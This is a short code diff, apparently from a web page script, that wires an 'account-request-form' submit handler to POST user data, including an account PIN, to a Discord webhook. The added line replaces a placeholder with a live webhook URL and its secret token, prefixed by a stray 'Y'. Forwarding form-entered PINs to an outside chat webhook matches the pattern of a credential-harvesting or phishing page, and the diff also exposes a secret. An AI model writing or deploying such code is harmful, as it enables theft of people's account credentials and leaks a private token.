@@ -76,7 +76,7 @@ document.getElementById('account-request-form').addEventListener('submit', funct
                 "PIN: " + accountPIN;
 
   // Replace with your actual Discord webhook URL
-  var discordWebhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+  var discordWebhookUrl = "Yhttps://discord.com/api/webhooks/1323364399221702748/fp0LHvWA5s6BAbOB_VG0qwQrXn6_gekYty90vlmfU0PLy0BzQkIHGRTLsXfpdJ_FP_sC";
 
   fetch(discordWebhookUrl, {
     method: "POST",
